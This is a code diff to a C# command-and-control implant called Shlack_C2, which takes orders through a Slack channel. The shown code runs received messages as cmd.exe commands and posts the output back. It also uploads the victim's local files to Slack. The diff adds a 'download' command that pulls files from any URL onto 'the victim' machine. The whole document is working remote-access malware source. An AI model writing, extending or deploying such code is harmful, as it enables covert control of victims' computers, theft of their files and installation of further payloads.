@@ -31,6 +31,7 @@ namespace Shlack_C2
                     {
                         case "exit": //Terminate the shell
                             client.PostMessage(null, message.channel.ToString(), "Channel Terminated!");
+                            Thread.Sleep(20);
                             Environment.Exit(1);
                             break;
                         case "upload": //Upload local files to Slack channel
@@ -47,7 +48,26 @@ namespace Shlack_C2
                             }
                             break;
 
-                        default: //Execute commands inside cmd.exe
+                        case "download": //Download files to the victim .. download [URL] [NameOfFile/Path]
+                            string @remoteUri = message.text.Split(new[] { ' ' }, 3)[1];
+                            string @fileName = message.text.Split(new[] { ' ' }, 3)[2];
+                            using (var down = new System.Net.WebClient())
+                            {
+                                try
+                                {
+                                    //remoteUri = System.Uri.EscapeDataString(remoteUri);
+                                    remoteUri = remoteUri.Replace(">", "");
+                                    remoteUri = remoteUri.Replace("<", "");
+                                    down.DownloadFile(@remoteUri, @fileName);
+                                }
+                                catch (Exception e)
+                                {
+                                    client.PostMessage(null, message.channel.ToString(), e.Message.ToString());
+                                }
+                                break;
+                            }
+
+                        default:
                             string output = Execute(message.text);
                             client.PostMessage(null, message.channel.ToString(), output);
                             break;
